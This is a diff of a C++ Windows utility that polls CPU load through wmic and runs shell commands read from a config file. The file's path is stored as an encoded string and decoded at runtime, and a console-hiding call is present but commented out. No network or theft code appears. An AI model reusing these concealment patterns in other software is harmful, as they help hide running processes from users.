@@ -32,9 +32,10 @@ bool cons = false;
 
 vector<hide::line> Run;
 
-#define TIMEOUT 10
-#define DEADLINE  3
-#define    THRMAX 3
+#define TIMEOUT     10
+#define DEADLINE    5 
+
+int THRMAX = 0;
 
 /*
  * ==================
@@ -50,7 +51,7 @@ while( fgets(buff, sizeof(buff), wmic)!=NULL) {
     percent = buff;
     if ( isdigit( *percent.begin()) ) break;
 }
-pclose(wmic);
+::pclose(wmic);
 istringstream sper(percent);
 sper >> CPU;
 if (show_cpu) cout << CPU << endl;
@@ -115,7 +116,7 @@ cout << Run[thr].c_str() << endl;
  * ==================
  */
 void Timer (void) {
-::SetTimer (NULL, 0, 3000, (TIMERPROC) &CPUsage);
+::SetTimer (NULL, 0, 5000, (TIMERPROC) &CPUsage);
 
 static MSG msg;
 while( ::GetMessage(&msg, NULL, 0, 0)) {
@@ -138,7 +139,7 @@ if (argc > 1) {
 
 //if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );
 
-static hide::line name("");
+static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
     name.decode();
     if (cons) cout << name << endl;
     ifstream  ini( name.c_str(), ios::in); 
@@ -147,12 +148,13 @@ static hide::line name("");
 
 static hide::line arg, Args;
 
-Run.push_back("echo ");
+Run.push_back("echo");
 
 while ( getline(ini, arg)) {
     if ( *(arg.begin()) == '#') {
         Args.append(" 2>&1");
         Run.push_back(Args);
+        THRMAX++;
         Args.clear();
         continue;
     }
@@ -167,20 +169,19 @@ if (cons)
 if ( !Run.size())
     throw runtime_error("never mind");
 
+    cout << "MAX: " << THRMAX << endl;
 
 thread th1(Timer);
 th1.detach();
 
 static string console;
 while ( getline (cin, console)) {
-cout << console << " what?!" << endl;
+    cout << console << " what?!" << endl;
 }
 
-if(pipe) pclose(pipe);
 return 0;
 
 } catch (const exception& e) {
     cerr << e.what() << endl;
-if(pipe) pclose(pipe);
-return 1;
+    return 1;
 }}
